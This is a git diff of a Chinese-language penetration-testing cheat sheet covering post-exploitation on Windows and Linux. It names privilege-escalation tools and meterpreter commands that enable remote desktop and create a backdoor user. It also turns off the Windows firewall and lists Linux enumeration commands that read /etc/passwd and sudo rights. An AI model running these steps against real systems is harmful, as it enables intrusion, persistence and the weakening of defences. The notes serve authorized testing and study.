@@ -1,7 +1,7 @@
 #  信息收集
+## windows
 
 ```shell
-# windows
 ## 提权
 JuicyPotato
 SweetPotato
@@ -10,10 +10,17 @@ echo 其他漏洞见 z02
 meter> upload /root/fscan64.exe # 1.ipconfig 查看网段, # 2.arp -a # 2.1 route print # 3. fscan扫描 横向移动
 meterpreter > run post/windows/manage/enable_rdp # 开 rdp
 meterpreter > run getgui -e                      # 开启远程桌面
-proxychains rdesktop 192.168.52.141
 meterpreter > run getgui -u xiaowei -p 123456    # 创建用户
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1                              # 开启3389远程桌面
 netsh advfirewall set allprofiles state off 
-netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow # 放行3389
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes                                 # M2: 放行3389
+netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow # M1: 放行3389
+
+# 远程桌面
+proxychains rdesktop 192.168.52.141
+rdesktop -u yourname -p password -g 1024x720 192.168.0.2
+remmina # 可配代理 见 90_tools.md
+
 net config Workstation # (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)
 net localgroup administrators
 net view # 查看局域网内所有计算机
@@ -21,10 +28,36 @@ net view # 查看局域网内所有计算机
 Ladon 192.168.52.0/24 OnlinePC
 net view /domain 查看域情况
 CS和msf联动
+```
 
 
-# linux 
+## linux 
+[Linux内网渗透基础篇](https://mp.weixin.qq.com/s/MV4bTIW7YKiBgS6r03_FFw)
+```shell
+get_info_01_linux.sh
 meterpreter > getSystem "whoami"
+
+uname -a    # 获取所有版本信息
+uname -m    # 获取Linux内核架构
+cat /proc/version    # 获取内核信息 
+cat /etc/*-release   # 发布信息
+cat /etc/issue    # 发布信息
+hostname    # 获取主机名
+cat /etc/passwd    # 列出系统所有用户 
+cat /etc/group    # 列出系统所有组 
+w    # 查看目前登录的用户
+whoami    # 查看当前用户 
+id    # 查看当前用户信息 
+sudo -l    # 列出目前用户可执行与无法执行的指令 
+ps aux    # 查看进程信息 
+ls -la /etc/cron*    # 查看计划任务
+ls -la /tmp
+ifconfig -a    # 列出网络接口信息 
+cat /etc/network/interfaces    # 列出网络接口信息 
+arp -a    # 查看系统arp表 
+route    # 打印路由信息
+netstat -anplt    # 打印本地端口开放信息 
+iptables -L    # 列出iptable的配置规则
 ```
 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
